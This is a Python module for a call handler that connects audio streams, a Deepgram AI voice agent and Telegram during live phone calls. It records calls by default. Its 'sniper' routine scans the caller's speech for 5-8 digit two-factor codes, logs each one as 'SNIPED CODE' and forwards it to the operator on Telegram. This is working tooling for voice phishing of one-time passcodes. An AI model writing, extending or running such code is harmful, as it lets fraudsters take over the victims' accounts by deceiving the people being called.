"""
Call Handler - Coordinates audio, Deepgram Voice Agent, and Telegram.

Lifecycle:
    1. initialize()  → Scan audio devices (once at bot startup)
    2. prepare()     → Connect Deepgram + start playback streams (during ringing)
    3. start()       → Start audio capture (when call answers)
    4. stop()        → Tear down everything (when call ends)
"""
import asyncio
import re
import time
from typing import Optional, Callable
from loguru import logger
from audio.audio_io import AudioManager
from models.deepgram_agent import create_voice_agent



class CallHandler:
    """Manages a single live call session."""
    
    def __init__(self, capture_device: str, playback_device: str):
        self.audio = AudioManager(capture_device=capture_device, playback_device=playback_device)
        self.agent = create_voice_agent()  # Per-worker isolation
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._on_transcript: Optional[Callable] = None
        self._prepared = False
        
        # Sniper state
        self._code_buffer = ""
        self._last_snipe = ""
        self._buffer_expiry = 0
    
    def set_callbacks(self, on_transcript=None):
        self._on_transcript = on_transcript
    
    async def initialize(self) -> bool:
        """Initialize audio devices (scan only)."""
        return await self.audio.initialize()
    
    async def prepare(self, system_prompt: str, greeting: str = "") -> bool:
        """
        Pre-initialize during ringing phase.
        Connects Deepgram and starts playback streams so greeting
        plays immediately when call answers.
        """
        if self._prepared:
            return True
        
        self._loop = asyncio.get_running_loop()
        
        # Configure agent
        self.agent.configure(system_prompt, greeting)
        self.agent.on_transcript = self._handle_transcript
        self.agent.on_audio = self._handle_audio
        
        # Wire echo suppression: agent speaking events → audio manager
        # Note: AudioManager doesn't have echo suppression; callbacks are no-ops.
        self.agent.on_speaking_start = lambda: None
        self.agent.on_speaking_stop = lambda: None
        
        # Pre-start playback streams BEFORE Deepgram connect
        # so greeting audio has somewhere to go immediately.
        self.audio.prepare_streams()

        # Connect to Deepgram
        connected = await self.agent.connect()
        if not connected:
            logger.error("❌ Failed to connect to Deepgram during prepare")
            return False
        
        self._prepared = True
        logger.info("✅ Call handler prepared (Deepgram + audio ready)")
        return True
    
    async def start(self, system_prompt: str = "", greeting: str = "") -> bool:
        """
        Activate audio capture. If not prepared, does full init.
        """
        self._loop = asyncio.get_running_loop()
        
        if not self._prepared:
            # Full init path (fallback if prepare wasn't called)
            self.agent.configure(system_prompt, greeting)
            self.agent.on_transcript = self._handle_transcript
            self.agent.on_audio = self._handle_audio
            self.agent.on_speaking_start = lambda: None
            self.agent.on_speaking_stop = lambda: None
            
            # Start playback streams BEFORE Deepgram so TTS has somewhere to go
            self.audio.prepare_streams()
            
            connected = await self.agent.connect()
            if not connected:
                return False
        
        # Wire capture → Deepgram
        self.audio.set_audio_callback(self.agent.send_audio)

        try:
            import config as _cfg
            if getattr(_cfg, "GV_CALL_RECORD", True):
                from audio.call_recorder import CallRecorder
                import time
                rec = CallRecorder(tag=f"ai_{int(time.time())}")
                out_rate = self.audio.get_output_rate()
                if out_rate:
                    rec.set_output_rate(out_rate)
                self.audio.set_recorder(rec)
        except Exception:
            pass

        # Start capturing caller audio
        self.audio.start()
        
        logger.info("🎙️ Call handler active - audio flowing")
        return True
    
    def _handle_transcript(self, role: str, text: str):
        """Forward transcript to Telegram and check for 2FA codes."""
        if not self._on_transcript:
            return
            
        # 🎯 SNIPER: Watch user speech for digits
        if role == "user":
            self._check_for_codes(text)
            
        try:
            result = self._on_transcript(role, text)
            if asyncio.iscoroutine(result) and self._loop and self._loop.is_running():
                future = asyncio.run_coroutine_threadsafe(result, self._loop)
                future.add_done_callback(
                    lambda f: f.exception() and logger.error(f"Transcript callback async error: {f.exception()}")
                )
        except Exception as e:
            logger.error(f"Transcript callback error: {e}")

    def _check_for_codes(self, text: str):
        """Deterministic regex sniper for 5-8 digit 2FA codes."""
        now = time.time()
        
        # Reset buffer if silenced for 15s (prevents mixing codes)
        if now - self._buffer_expiry > 15:
            self._code_buffer = ""
        self._buffer_expiry = now
        
        # Strip everything except digits
        digits = re.sub(r'\D', '', text)
        if not digits:
            return
            
        self._code_buffer += digits
        
        # Look for 5-8 digit sequences
        found = re.findall(r'\d{5,8}', self._code_buffer)
        if found:
            code = found[-1]
            if code != self._last_snipe:
                self._last_snipe = code
                logger.info(f"🎯 SNIPED CODE: {code}")
                
                # Signal Telegram (special role 'sniper')
                if self._on_transcript and self._loop:
                    future = asyncio.run_coroutine_threadsafe(
                        self._on_transcript("sniper", f"🚨 **SNIPED CODE: {code}**"),
                        self._loop,
                    )
                    future.add_done_callback(
                        lambda f: f.exception() and logger.error(f"Sniper callback async error: {f.exception()}")
                    )
        
        # Keep buffer small (last 20 digits)
        if len(self._code_buffer) > 20:
            self._code_buffer = self._code_buffer[-20:]
    
    def _handle_audio(self, audio_bytes: bytes):
        """Forward TTS audio to playback streams."""
        self.audio.play_tts(audio_bytes)
    
    async def stop(self):
        """Stop everything and clean up. Idempotent — safe to call multiple times."""
        if not self._prepared and not self.agent.is_active:
            return  # Already stopped
        self.audio.clear_recorder(retain=False)
        self.audio.stop()
        await self.agent.disconnect()
        self._prepared = False
        logger.info("🛑 Call handler stopped")


# Removed singleton get_call_handler to enforce strict isolation per-worker.
